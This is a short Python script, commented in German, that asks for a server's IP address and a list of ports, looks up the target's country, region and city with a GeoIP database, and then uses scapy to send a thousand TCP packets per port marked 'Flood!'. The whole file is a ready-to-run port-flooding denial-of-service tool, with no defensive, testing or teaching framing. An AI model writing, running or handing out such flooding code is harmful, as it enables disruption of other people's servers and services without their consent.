from scapy.all import *
import socket
import geoip2.database
import time
from colorama import init, Fore

# Initialisiere Colorama für farbigen Text
init(autoreset=True)

# Funktion zum Abrufen von Geolokalisierungsdaten anhand der IP-Adresse
def get_geo_info(ip):
    with geoip2.database.Reader('GeoLite2-City.mmdb') as reader:
        try:
            response = reader.city(ip)
            country = response.country.name
            region = response.subdivisions.most_specific.name
            city = response.city.name
            return country, region, city
        except geoip2.errors.AddressNotFoundError:
            return "Unknown", "Unknown", "Unknown"

# Funktion zum Senden von Paketen an die angegebenen Ports
def flood_ports(target_ip, ports):
    count = 0
    for port in ports:
        try:
            for _ in range(1000):  # 1000 Pakete auf einmal pro Port senden
                send(IP(dst=target_ip)/TCP(dport=port)/b"Flood!")
                count += 1
                print(Fore.YELLOW + f"Port {port} überflutet - Gesendete Pakete: {count}", end='\r')
        except:
            pass

def main():
    target_ip = input(Fore.GREEN + "Bitte gib die IP-Adresse des Servers ein: ")
    country, region, city = get_geo_info(target_ip)
    print(Fore.CYAN + f"Informationen zur IP-Adresse {target_ip}:")
    print(Fore.CYAN + f"Land: {country}, Region: {region}, Stadt: {city}")

    ports = [int(port) for port in input(Fore.YELLOW + "Bitte gib die Ports ein, die du überfluten möchtest (kommagetrennt): ").split(",")]

    print(Fore.RED + "Starte die Überflutung der Ports...")
    flood_ports(target_ip, ports)
    print(Fore.RED + "\nÜberflutung beendet. Warte eine Minute, bevor das Programm beendet wird...")
    time.sleep(60)  # Warte eine Minute, bevor das Programm beendet wird

if __name__ == "__main__":
    main()

